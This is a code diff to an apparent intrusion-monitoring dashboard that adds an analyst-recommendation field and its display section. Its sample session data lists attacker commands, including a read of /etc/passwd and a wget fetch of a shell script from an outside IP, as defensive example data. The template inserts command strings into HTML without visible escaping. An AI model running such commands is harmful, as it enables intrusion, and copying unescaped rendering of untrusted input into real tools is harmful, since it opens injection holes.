@@ -103,7 +103,8 @@
         intent: "Credential Access",
         duration: "4m 18s",
         commands: ["whoami", "id", "uname -a", "cat /etc/passwd", "wget http://185.234.219.x/a.sh"],
-        evidence: "The session showed admin-like username attempts, a read of a sensitive file, and an attempted external payload fetch."
+        evidence: "The session showed admin-like username attempts, a read of a sensitive file, and an attempted external payload fetch.",
+        analystRecommendation: "Rotate exposed credentials and preserve the session transcript for incident review."
       },
       {
         id: "sess-1047",
@@ -241,6 +242,10 @@
                 <ul class="command-list">
                   ${session.commands.map((command) => `<li>${command}</li>`).join("")}
                 </ul>
+              </section>
+              <section class="detail-block" aria-label="Analyst recommendation">
+                <h3>Analyst Recommendation</h3>
+                <p>${session.analystRecommendation || "Review the evidence and preserve the session transcript."}</p>
               </section>
             </div>
           </td>
